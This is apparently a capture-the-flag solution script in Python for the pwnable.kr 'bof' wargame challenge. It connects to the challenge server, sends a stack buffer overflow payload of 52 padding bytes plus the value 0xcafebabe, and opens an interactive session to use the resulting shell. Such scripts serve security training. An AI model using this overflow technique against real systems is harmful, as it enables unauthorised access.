from zio import *

r_color = COLORED(RAW, 'green')
w_color = COLORED(RAW, 'blue')

target = './bof'
target = ('pwnable.kr', 9000)

io = zio(target, print_read = r_color, print_write = w_color)

payload  = 'A' * 52
payload += l32(0xcafebabe)

#io.read_until('overflow me : ')
io.write(payload)

io.interact()
